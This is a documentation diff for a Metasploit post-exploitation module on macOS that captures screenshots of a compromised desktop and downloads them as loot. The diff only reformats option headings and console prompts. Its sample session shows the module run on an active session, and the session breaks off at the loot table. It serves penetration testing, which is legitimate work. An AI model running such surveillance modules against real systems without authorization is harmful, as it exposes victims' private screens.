@@ -13,19 +13,19 @@ This module takes screenshots of target desktop and automatically downloads them
 
 ## Options
 
-  **COUNT**
+### COUNT
   The number of screenshots to collect.  Default is `1`.
 
-  **DELAY**
+### DELAY
   Interval between screenshots in seconds. 0 for no delay.  Default is `10`.
 
-  **EXE_PATH**
+### EXE_PATH
   Path to remote screencapture executable.  Default is `/usr/sbin/screencapture`
 
-  **FILETYPE**
+### FILETYPE
   File format to use when saving a snapshot (Accepted: png, gif).  Default is `png`.
 
-  **TMP_PATH**
+### TMP_PATH
   Path to remote temp directory.  Default is `/tmp/<random>`
 
 ## Scenarios
@@ -33,16 +33,16 @@ This module takes screenshots of target desktop and automatically downloads them
 ### User level shell on OSX 10.14.4
 
 ```
-msf5 post(osx/capture/keylog_recorder) > use post/osx/capture/screen 
-msf5 post(osx/capture/screen) > set session 1
+msf post(osx/capture/keylog_recorder) > use post/osx/capture/screen 
+msf post(osx/capture/screen) > set session 1
 session => 1
-msf5 post(osx/capture/screen) > run
+msf post(osx/capture/screen) > run
 
 [*] Capturing 1 screenshots with a delay of 10 seconds
 [*] Screen Capturing Complete
 [*] Use "loot -t screen_capture.screenshot" to see file locations of your newly acquired loot
 [*] Post module execution completed
-msf5 post(osx/capture/screen) > loot -t screen_capture.screenshot
+msf post(osx/capture/screen) > loot -t screen_capture.screenshot
 
 Loot
 ====
